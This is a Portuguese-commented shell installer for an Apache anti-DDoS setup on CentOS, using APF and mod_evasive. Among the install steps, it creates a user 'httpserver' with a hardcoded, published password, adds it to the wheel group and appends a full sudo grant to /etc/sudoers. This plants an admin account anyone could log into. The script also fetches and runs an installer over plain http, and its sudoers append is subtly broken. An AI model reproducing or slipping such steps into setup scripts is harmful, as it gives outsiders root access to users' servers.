# Voce precisa ter o apache previamente instalado, assim como o git
# Testado apenas em CentOS

echo "Clonando repositorio..."
sudo git clone https://github.com/abelantunes98/AntiDdos-CentOS
cd AntiDdos-CentOS

echo "Baixando dependencias."
sudo yum install httpd-devel
sudo yum install centos-release-scl
sudo useradd httpserver -m -p $(openssl passwd -1 serverhttp12)
sudo usermod -aG wheel httpserver
sudo echo "httpserver ALL=(ALL)    ALL" >> /etc/sudoers
sudo yum install rh-python36
sudo yum groupinstall 'Development tools'
sudo wget http://www.rfxn.com/downloads/apf-current.tar.gz
sudo tar -zxvf apf-current.tar.gz
sudo rm apf-current.tar.gz
cd apf-*
sudo bash ./install.sh

echo "Caso pergunte, selecione sobrescrever."
cd ..
rm -rf apf-*
sudo mv conf.apf /etc/apf/conf.apf

echo "Baixando arquivos..."
sudo wget https://codeload.github.com/shivaas/mod_evasive/zip/master
sudo unzip master

echo "Instalando..."
sudo mv mod_evasive-master /opt/
sudo mv httpd.conf /opt/
cd /opt/mod_evasive-master
sudo apxs -i -c -a mod_evasive24.c
systemctl restart httpd

apachectl -M | grep evasive

echo "Configurando..."
cd ..

#sudo mv httpd.conf /etc/httpd/conf/
echo "Caso o arquivo /etc/httpd/conf/httpd.conf esteja vazio, substitua pelo que foi baixado, caso contrario\ncole o conteudo do arquivo httpd.conf que foi baixado no final dele."

echo "execute sudo nano /etc/httpd/conf/httpd.conf e mude o email por um seu."
